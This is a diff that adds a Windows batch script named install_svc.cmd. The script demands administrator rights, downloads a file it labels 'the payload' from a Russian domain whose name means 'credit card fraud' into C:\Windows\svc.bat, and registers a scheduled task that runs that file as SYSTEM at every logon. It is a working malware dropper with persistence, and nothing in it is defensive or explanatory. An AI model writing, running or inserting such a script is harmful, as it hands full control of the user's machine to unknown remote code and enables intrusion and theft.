@@ -1,0 +1,39 @@
+@echo off
+REM ----------------------------------------
+REM install_svc.cmd
+REM Downloads svc.bat and schedules it at logon
+REM ----------------------------------------
+
+REM -- 1) Ensure we're running elevated
+NET SESSION >nul 2>&1
+IF ERRORLEVEL 1 (
+    ECHO [ERROR] Administrative privileges required.
+    ECHO Please right-click and choose "Run as administrator".
+    EXIT /B 1
+)
+
+REM -- 2) Download the payload into C:\Windows\svc.bat
+ECHO Downloading svc.bat to C:\Windows...
+powershell -NoProfile -Command ^
+  "try { Invoke-WebRequest -Uri 'https://www.kreditkartenbetrug.ru/b' -UseBasicParsing -OutFile 'C:\Windows\svc.bat'; exit 0 } catch { exit 1 }"
+IF ERRORLEVEL 1 (
+    ECHO [ERROR] Failed to download svc.bat.
+    EXIT /B 1
+)
+
+REM -- 3) Create a Scheduled Task to run svc.bat at each logon
+ECHO Registering scheduled task "RunSvcBat"...
+schtasks /Create ^
+    /SC ONLOGON ^
+    /RL HIGHEST ^
+    /RU "SYSTEM" ^
+    /TN "RunSvcBat" ^
+    /TR "C:\Windows\svc.bat" ^
+    /F >nul
+
+IF ERRORLEVEL 1 (
+    ECHO [ERROR] Failed to create scheduled task.
+    EXIT /B 1
+)
+
+ECHO Scheduled task "RunSvcBat" created successfully.
